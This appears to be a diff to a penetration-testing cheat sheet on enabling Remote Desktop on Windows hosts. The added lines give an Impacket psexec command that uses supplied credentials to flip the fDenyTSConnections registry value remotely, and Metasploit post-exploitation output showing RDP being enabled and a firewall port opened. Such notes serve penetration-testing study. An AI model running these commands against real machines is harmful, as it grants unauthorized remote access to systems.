@@ -59,11 +59,25 @@ netsh firewall set service remotedesktop enable
 
 ```text
 psexec \\host reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f 
+/usr/local/bin/psexec.py user:password@10.0.0.1 reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
+
 ```
 
 ## Enable using metasploit
 
 ```text
 use post/windows/manage/enable_rdp
+msf5 post(windows/manage/enable_rdp) > run
+
+[*] Enabling Remote Desktop
+[*] 	RDP is disabled; enabling it ...
+[*] Setting Terminal Services service startup mode
+[*] 	The Terminal Services service is not set to auto, changing it to auto ...
+[+] 	RDP Service Started
+[*] 	Opening port in local firewall if necessary
+[*] For cleanup execute Meterpreter resource file: /root/.msf4/loot/20200520112125_default_10.50.30.103_host.windows.cle_789147.txt
+[*] Post module execution completed
+msf5 post(windows/manage/enable_rdp) > 
+
 ```
 
